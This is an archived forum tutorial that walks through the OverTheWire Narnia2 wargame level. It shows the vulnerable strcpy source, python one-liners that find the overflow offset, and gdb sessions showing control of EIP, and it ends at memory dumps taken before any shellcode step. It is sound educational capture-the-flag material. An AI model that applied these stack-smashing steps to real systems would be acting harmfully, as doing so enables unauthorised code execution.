<!DOCTYPE html>
<html lang="en">
  <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="utf-8">
    <title>Over The Wire: Narnia2 - Smashing $EIP for fun and free - Exploit Development - 0x00sec - The Home of the Hacker</title>
    <meta name="description" content="Over The Wire: Narnia2 - Smashing the stack.
Ok, so from narnia0 and narnia1 we have working shellcode for the narnia servers, and a general understanding of how to smash the stack, irrespectively lol. This time, we are &amp;hellip;">
    <meta name="generator" content="Discourse 3.6.0.beta2-latest - https://github.com/discourse/discourse version 3b1964f3ed8bdc2f181e2abccb1b116e4b814db5">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.html">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.html">
<meta name="theme-color" media="all" content="#171616">

<meta name="color-scheme" content="dark">

<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
<link rel="canonical" href="704.html" />

<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">

    
    <link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4.css_%3b%20filename_%3dUTF-8%27%27color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" class="light-scheme" data-scheme-id="15"/>

<link href="../../stylesheets/common_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27common_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common"  />

  <link href="../../stylesheets/mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile"  />
  <link href="../../stylesheets/desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop"  />



    <link href="../../stylesheets/chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="chat"  />
    <link href="../../stylesheets/checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="checklist"  />
    <link href="../../stylesheets/discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-cakeday"  />
    <link href="../../stylesheets/discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-details"  />
    <link href="../../stylesheets/discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-lazy-videos"  />
    <link href="../../stylesheets/discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-local-dates"  />
    <link href="../../stylesheets/discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-narrative-bot"  />
    <link href="../../stylesheets/discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-presence"  />
    <link href="../../stylesheets/discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-solved"  />
    <link href="../../stylesheets/discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-templates"  />
    <link href="../../stylesheets/discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-topic-voting"  />
    <link href="../../stylesheets/docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="docker_manager"  />
    <link href="../../stylesheets/footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="footnote"  />
    <link href="../../stylesheets/poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="poll"  />
    <link href="../../stylesheets/spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="spoiler-alert"  />
    <link href="../../stylesheets/chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="chat_mobile"  />
    <link href="../../stylesheets/discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-solved_mobile"  />
    <link href="../../stylesheets/discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-topic-voting_mobile"  />
    <link href="../../stylesheets/chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="chat_desktop"  />
    <link href="../../stylesheets/discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="discourse-topic-voting_desktop"  />
    <link href="../../stylesheets/poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="poll_desktop"  />

  <link href="../../stylesheets/common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960db.css_%3b%20filename_%3dUTF-8%27%27common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960dba97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common_theme" data-theme-id="57" data-theme-name="0x00sec-v2"/>
    <link href="../../stylesheets/mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38.css_%3b%20filename_%3dUTF-8%27%27mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile_theme" data-theme-id="4" data-theme-name="mobile chrome"/>
    <link href="../../stylesheets/desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96.css_%3b%20filename_%3dUTF-8%27%27desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2"/>

    <link rel="stylesheet" href="../../../external.html?link=https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="../../../external.html?link=https://s3.amazonaws.com/0x00sec/highlight.pack.js" nonce="VK5v7N3P3Ni6EsU2IOrMhDUbA"></script>
<script defer="" src="../../theme-javascripts/05954ff525aceb8daa8b585f92d758d311ae7077.js_%3b%20filename_%3dUTF-8%27%2705954ff525aceb8daa8b585f92d758d311ae7077a97f.js?__ws=d.clarkee.co.uk" data-theme-id="40" nonce="VK5v7N3P3Ni6EsU2IOrMhDUbA"></script>
    
        <link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Over The Wire: Narnia2 - Smashing $EIP for fun and free&#39;" href="704.rss" />
    <meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://d.clarkee.co.uk/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:image" content="https://d.clarkee.co.uk/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:url" content="https://d.clarkee.co.uk/t/over-the-wire-narnia2-smashing-eip-for-fun-and-free/704" />
<meta name="twitter:url" content="https://d.clarkee.co.uk/t/over-the-wire-narnia2-smashing-eip-for-fun-and-free/704" />
<meta property="og:title" content="Over The Wire: Narnia2 - Smashing $EIP for fun and free" />
<meta name="twitter:title" content="Over The Wire: Narnia2 - Smashing $EIP for fun and free" />
<meta property="og:description" content="Over The Wire: Narnia2 - Smashing the stack. Ok, so from narnia0 and narnia1 we have working shellcode for the narnia servers, and a general understanding of how to smash the stack, irrespectively lol. This time, we are given a real world example (minus ALSR/DEP) of exploiting a program and gaining execution flow to pop a shell and compromise the system. The source code to narnia2.c is as follows:   narnia2@melinda:/games/narnia$ cat narnia2.c  int main(int argc, char * argv)  {  char buf[128];  ..." />
<meta name="twitter:description" content="Over The Wire: Narnia2 - Smashing the stack. Ok, so from narnia0 and narnia1 we have working shellcode for the narnia servers, and a general understanding of how to smash the stack, irrespectively lol. This time, we are given a real world example (minus ALSR/DEP) of exploiting a program and gaining execution flow to pop a shell and compromise the system. The source code to narnia2.c is as follows:   narnia2@melinda:/games/narnia$ cat narnia2.c  int main(int argc, char * argv)  {  char buf[128];  ..." />
<meta property="og:article:section" content="Exploit Development" />
<meta property="og:article:section:color" content="92278F" />
<meta property="og:article:tag" content="overthewire" />
<meta property="og:article:tag" content="stack" />
<meta property="og:article:tag" content="narnia" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="6 mins ğŸ•‘" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="14 â¤" />
<meta property="article:published_time" content="2016-07-06T19:18:41+00:00" />
<meta property="og:ignore_canonical" content="true" />


    
  </head>
  <body class="crawler ">
    <div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">
  <!--<a href="https://git.0x00sec.org" class="dow-menu">GitLab</a>  
  <a href="https://blog.0x00sec.org/irc" class="dow-menu">IRC</a>!-->
  <a href="../../../external.html?link=https://init.0x00sec.org/" class="dow-menu">Init</a>
  <a href="../../../external.html?link=https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
  <a href="../../../external.html?link=https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
    <header>
  <a href="../../index.html">0x00sec - The Home of the Hacker</a>
</header>

    <div id="main-outlet" class="wrap" role="main">
        <div id="topic-title">
    <h1>
      <a href="704.html">Over The Wire: Narnia2 - Smashing $EIP for fun and free</a>
    </h1>

      <div class="topic-category" itemscope itemtype="../../../external.html?link=http://schema.org/BreadcrumbList">
          <span itemprop="itemListElement" itemscope itemtype="../../../external.html?link=http://schema.org/ListItem">
            <a href="../../c/exploit-development/53.html" class="badge-wrapper bullet" itemprop="item">
              <span class='badge-category-bg' style='background-color: #92278F'></span>
              <span class='badge-category clear-badge'>
                <span class='category-name' itemprop='name'>Exploit Development</span>
              </span>
            </a>
            <meta itemprop="position" content="1" />
          </span>
      </div>

      <div class="topic-category">
        <div class='discourse-tags list-tags'>
            <a href='../../tag/overthewire.html' class='discourse-tag' rel="tag">overthewire</a>, 
            <a href='../../tag/stack.html' class='discourse-tag' rel="tag">stack</a>, 
            <a href='../../tag/narnia.html' class='discourse-tag' rel="tag">narnia</a>
        </div>
      </div>
  </div>

  

    <div itemscope itemtype='../../../external.html?link=http://schema.org/DiscussionForumPosting'>
      <meta itemprop='headline' content='Over The Wire: Narnia2 - Smashing $EIP for fun and free'>
      <link itemprop='url' href='704.html'>
      <meta itemprop='datePublished' content='2016-07-06T19:18:41Z'>
        <meta itemprop='articleSection' content='Exploit Development'>
      <meta itemprop='keywords' content='overthewire, stack, narnia'>
      <div itemprop='publisher' itemscope itemtype="../../../external.html?link=http://schema.org/Organization">
        <meta itemprop='name' content='0x00sec - The Home of the Hacker'>
          <div itemprop='logo' itemscope itemtype="../../../external.html?link=http://schema.org/ImageObject">
            <meta itemprop='url' content='../../uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.html'>
          </div>
      </div>


          <div id='post_1'  class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/123loaded.html'><span itemprop='name'>123loaded</span></a>
                (123loaded)
              </span>

                <link itemprop="mainEntityOfPage" href="704.html">


              <span class="crawler-post-infos">
                  <time  datetime='2016-07-06T19:18:41Z' class='post-time'>
                    July 6, 2016,  7:18pm
                  </time>
                  <meta itemprop='dateModified' content='2016-10-27T23:19:53Z'>
              <span itemprop='position'>1</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <h2><a name="p-3416-over-the-wire-narnia2-smashing-the-stack-1" class="anchor" href="#p-3416-over-the-wire-narnia2-smashing-the-stack-1"></a>Over The Wire: Narnia2 - Smashing the stack.</h2>
<p>Ok, so from <a href="../../../external.html?link=https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663/5" rel="noopener nofollow ugc">narnia0</a> and <a href="../../../external.html?link=https://0x00sec.org/t/over-the-wire-narnia1-environment-variables-and-shellcode/675" rel="noopener nofollow ugc">narnia1</a> we have working shellcode for the narnia servers, and a general understanding of how to smash the stack, irrespectively lol. This time, we are given a real world example (minus ALSR/DEP) of exploiting a program and gaining execution flow to pop a shell and compromise the system. The source code to narnia2.c is as follows:</p>
<blockquote>
<p>narnia2@melinda:/games/narnia$ cat narnia2.c<br>
int main(int argc, char * argv<span class="chcklst-box fa fa-square-o fa-fw"></span>)<br>
{<br>
char buf[128];</p>
</blockquote>
<blockquote>
<p>if(argc == 1){<br>
printf(â€œUsage: %s argument\nâ€, argv[0]);<br>
exit(1);<br>
}<br>
strcpy(buf,argv[1]);<br>
printf(â€œ%sâ€, buf);</p>
</blockquote>
<blockquote>
<p>return 0;<br>
}</p>
</blockquote>
<p>Ok, so even if you donâ€™t know any C, this code is extremely basic. First it declares a buffer of 128 characters named <strong>buf</strong>, makes sure the user is only trying to pass it <em>one</em> argument, else exit, and then copy that argument into our variable <strong>buf</strong> using <strong>strcpy()</strong>. Strcpy() is a function in Câ€™s standard library, it copies the contents from one buffer to another buffer, but what is most important to know about strcpy() is that it is one of a handful of functions in C that has no <strong>bounds checking</strong>. What this means is that you can tell it to copy a 512 byte array into a 100 byte buffer, and it wonâ€™t have <em>any</em> issues with that whatsoever (until run time of course <img src="../../images/emoji/twitter/joy8e5e.png?v=15" title=":joy:" class="emoji" alt=":joy:" loading="lazy" width="20" height="20">). it will just fill up the destination buffer with the first 100 bytes from the source buffer, and then proceed to write 412 bytes from the source buffer right over whatever values are <strong>below</strong> the destination buffer on <strong>the stack</strong>. For this level, we donâ€™t need to know Everything about the stackâ€¦ but hereâ€™s what you need to know.</p>
<p>The stack holds the return address (the last address in memory that code was executing at before it jumped to a new block of memory for a new function), any variables that are passed with the function are actually pushed onto the stack at <em>at the time the function is called</em>, and any fixed-length variables within the function are pushed onto the stack at this time. Now, technically what I described above is a single â€œstack frameâ€, and <em>the stack</em> in its entirety usually consists of several stack frames at any given point in time as it grows/shrinks in size depending on how many functions deep you are (and how many variables each of those functions use). Conversely, <em>the heap</em> is the section of memory that a program gets allocated to use for variables of an indeterminate size and it starts at the lowest piece of memory the program is allocated and grows up <em>towards the stack</em>. Ghettofabulous Fig. 1 demonstrates this as ghetto as possible.</p>
<blockquote>
<pre><code>                      |        ^        |  lower addresses
</code></pre>
</blockquote>
<pre><code>                      |        |        |
%esp -stack pointer -&gt;+-----------------+ always points to top of stack
                      |.................|
                      |.local variables.|  accessed with addresses %ebp-# or %esp+#
                      |.................|
%ebp -frame pointer -&gt;+-----------------+ points to the bottom of a single stack frame, which contains the address to return to, usually also %eip
                      |.................|
                      |.................|  older stack frames
                      |.................|
 bottom of the stack-&gt;+-----------------+ always points at bottom of stack
                      |       v         |  higher addresses v
</code></pre>
<p>Values on the stack are usually referenced to by their offset from $EBP, the local Base Pointer, which points to the bottom of a functions stack, aka the current stack frame, <em>or</em> theyâ€™re referenced by their offset from $ESP, the Stack Pointer, which always points to the top of the stack.</p>
<p>The stack grows when we <strong>call a function</strong>, and decreases in size when we <strong>return from a function</strong>.</p>
<p>Confused? Good. Nobody makes the jump their first time. Simply attacking this binary without understanding the stack actually can work though, following some basic steps. So Iâ€™ll now switch back into basic bitch mode. Letâ€™s whip out our giant python and slap my bitch up.</p>
<blockquote>
<p>narnia2@melinda:/games/narnia$ pythong -c â€˜print -c â€œAâ€*136â€™ | ./narnia2<br>
No command â€˜pythongâ€™ found, did you mean:<br>
Command â€˜pythonâ€™ from package â€˜python-minimalâ€™ (main)<br>
pythong: command not found</p>
</blockquote>
<p>Fuck, Iâ€™ve found this fruedian finger slip one too many times now. Letâ€™s shut it down.</p>
<blockquote>
<p>narnia2@melinda:/games/narnia$ alias pythong=â€˜pythonâ€™<br>
narnia2@melinda:/games/narnia$ pythong -c â€˜print â€œA<em>132"â€™ | ./narnia2<br>
narnia2@melinda:/games/narnia$<br>
narnia2@melinda:/games/narnia$ pythong -c 'print "A</em>136â€â€™ | ./narnia2<br>
narnia2@melinda:/games/narnia$<br>
narnia2@melinda:/games/narnia$ pythong -c â€˜print â€œA<em>140"â€™ | ./narnia2<br>
Illegal Instruction.<br>
narnia2@melinda:/games/narnia$ pythong -c 'print "A</em>144â€â€™ | ./narnia2<br>
Segmentation Fault.</p>
</blockquote>
<p>Ok, <span class="hashtag-raw">#gg</span> sauce in and around my mouth. We got a seg fault boyz. Seg faults are the result of a program crashing because it tried to read or write to an inaccessible memory location. If an attacker can somehow <strong>know the location it is trying to access and have code there waiting for it</strong> or <strong>change the address it is trying to access to be the location of your code</strong>, a program can be exploited.<br>
When we send the program 132 bytes, it over writes the next 4 bytes on the stack, but this does not actually corrupt anything, so the program exits normally. Same with 136 bytes. 140 causes an illegal instruction (explained later or in next tutorial), and 144 smashes the stack to the point of corrupting the return address, causing the program to try to jump to the memory address 0x41414141 when it returns, which is either an illegal address for that program to be accessing, or an address with garbage data at it, and thus the program seg faultsâ€¦ let us take a close look at what is happening in <strong>gdb</strong>, the gnu debugger.</p>
<blockquote>
<p>narnia2@melinda:/games/narnia$ gdb<br>
GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1<br>
Copyright (C) 2014 Free Software Foundation, Inc.<br>
License GPLv3+: GNU GPL version 3 or later <a href="../../../external.html?link=http://gnu.org/licenses/gpl.html" rel="noopener nofollow ugc">http://gnu.org/licenses/gpl.html</a><br>
This is free software: you are free to change and redistribute it.<br>
There is NO WARRANTY, to the extent permitted by law.  Type â€œshow copyingâ€<br>
and â€œshow warrantyâ€ for details.<br>
This GDB was configured as â€œx86_64-linux-gnuâ€.<br>
Type â€œshow configurationâ€ for configuration details.<br>
For bug reporting instructions, please see:<br>
<a href="../../../external.html?link=http://www.gnu.org/software/gdb/bugs/" rel="noopener nofollow ugc">http://www.gnu.org/software/gdb/bugs/</a>.<br>
Find the GDB manual and other documentation resources online at:<br>
<a href="../../../external.html?link=http://www.gnu.org/software/gdb/documentation/" rel="noopener nofollow ugc">http://www.gnu.org/software/gdb/documentation/</a>.<br>
For help, type â€œhelpâ€.<br>
Type â€œapropos wordâ€ to search for commands related to â€œwordâ€.<br>
(gdb) file narnia2<br>
Reading symbols from narnia2â€¦(no debugging symbols found)â€¦done.<br>
(gdb) set args $(python -c â€˜print â€œAâ€*144â€™)<br>
(gdb) run<br>
Starting program: /games/narnia/narnia2 $(python -c â€˜print â€œAâ€*144â€™)</p>
</blockquote>
<blockquote>
<p>Program received signal SIGSEGV, Segmentation fault.<br>
0x41414141 in ?? ()<br>
(gdb) set args $(python -c â€˜print â€œAâ€*143â€™)<br>
(gdb) run<br>
The program being debugged has been started already.<br>
Start it from the beginning? (y or n) y</p>
</blockquote>
<blockquote>
<p>Starting program: /games/narnia/narnia2 $(python -c â€˜print â€œAâ€*143â€™)</p>
</blockquote>
<blockquote>
<p>Program received signal SIGSEGV, Segmentation fault.<br>
0x00414141 in ?? ()<br>
(gdb) set args $(python -c â€˜print â€œAâ€*140 + â€œBCDEâ€â€™)<br>
(gdb) run<br>
The program being debugged has been started already.<br>
Start it from the beginning? (y or n) y</p>
</blockquote>
<blockquote>
<p>Starting program: /games/narnia/narnia2 $(python -c â€˜print â€œAâ€*140 + â€œBCDEâ€â€™)</p>
</blockquote>
<blockquote>
<p>Program received signal SIGSEGV, Segmentation fault.<br>
0x45444342 in ?? ()</p>
</blockquote>
<p>So, we confirmed that after 140 bytes, the next 4 bytes smash the stack and overwrite the saved instruction pointer $EIP (which in this case is also the local base pointer $EBP, since we are at the outer most stack frame, or â€œstack frame 0â€). We confirmed that we can control this value. So now what?</p>
<p>Now, we want to change that address to be an address that points to a location in memory that <em>we control</em>. And what do we control? We control the input to <strong>buf[]</strong>, so lets find out where buff is in memory. (Note: buff may actually me in a couple places in memoryâ€¦ as long as where itâ€™s at is executable memory, itâ€™s fine.)</p>
<blockquote>
<p>(gdb) x/40x $esp-0x14<br>
0xffffd63c:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd64c:    0x45444342    0x00000000    0xffffd6e4    0xffffd6f0<br>
0xffffd65c:    0xf7feacca    0x00000002    0xffffd6e4    0xffffd684<br>
0xffffd66c:    0x08049768    0x0804821c    0xf7fc9000    0x00000000<br>
0xffffd67c:    0x00000000    0x00000000    0xb433f6ed    0x8cea72fd<br>
0xffffd68c:    0x00000000    0x00000000    0x00000000    0x00000002<br>
0xffffd69c:    0x08048360    0x00000000    0xf7ff04c0    0xf7e3b9e9<br>
(gdb) x/50x $esp-0x100<br>
0xffffd550:    0xf7fcd2e8    0xf7fcd000    0xffffd574    0x08049758<br>
0xffffd560:    0x0804821c    0x080481bc    0x00000000    0x00000000<br>
0xffffd570:    0x00000000    0xf7e286d4    0xf7e6532b    0xf7fc9000<br>
0xffffd580:    0x00000000    0x00000000    0xffffd648    0xf7e6edff<br>
0xffffd590:    0xf7fc9ac0    0x08048574    0xffffd5b4    0xf7e6edd0<br>
0xffffd5a0:    0xffffd5c0    0xf7ffd938    0xf7fc9000    0x080484bc<br>
0xffffd5b0:    0x08048574    0xffffd5c0    0x00000000    0x00000000<br>
0xffffd5c0:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd5d0:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd5e0:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd5f0:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd600:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd610:    0x41414141    0x41414141<br>
(gdb) x/50x $esp-0xdc<br>
0xffffd574:    0xf7e286d4    0xf7e6532b    0xf7fc9000    0x00000000<br>
0xffffd584:    0x00000000    0xffffd648    0xf7e6edff    0xf7fc9ac0<br>
0xffffd594:    0x08048574    0xffffd5b4    0xf7e6edd0    0xffffd5c0<br>
0xffffd5a4:    0xf7ffd938    0xf7fc9000    0x080484bc    0x08048574<br>
0xffffd5b4:    0xffffd5c0    0x00000000    0x00000000    0x41414141<br>
0xffffd5c4:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd5d4:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd5e4:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd5f4:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd604:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd614:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd624:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd634:    0x41414141    0x41414141<br>
(gdb) x/50x $esp-0xcc<br>
0xffffd584:    0x00000000    0xffffd648    0xf7e6edff    0xf7fc9ac0<br>
0xffffd594:    0x08048574    0xffffd5b4    0xf7e6edd0    0xffffd5c0<br>
0xffffd5a4:    0xf7ffd938    0xf7fc9000    0x080484bc    0x08048574<br>
0xffffd5b4:    0xffffd5c0    0x00000000    0x00000000    0x41414141<br>
0xffffd5c4:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd5d4:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd5e4:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd5f4:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd604:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd614:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd624:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd634:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd644:    0x41414141    0x41414141<br>
(gdb) x/50x $esp-0xac<br>
0xffffd5a4:    0xf7ffd938    0xf7fc9000    0x080484bc    0x08048574<br>
0xffffd5b4:    0xffffd5c0    0x00000000    0x00000000    0x41414141<br>
0xffffd5c4:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd5d4:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd5e4:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd5f4:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd604:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd614:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd624:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd634:    0x41414141    0x41414141    0x41414141    0x41414141<br>
0xffffd644:    0x41414141    0x41414141    0x45444342    0x00000000<br>
0xffffd654:    0xffffd6e4    0xffffd6f0    0xf7feacca    0x00000002<br>
0xffffd664:    0xffffd6e4    0xffffd684</p>
</blockquote>
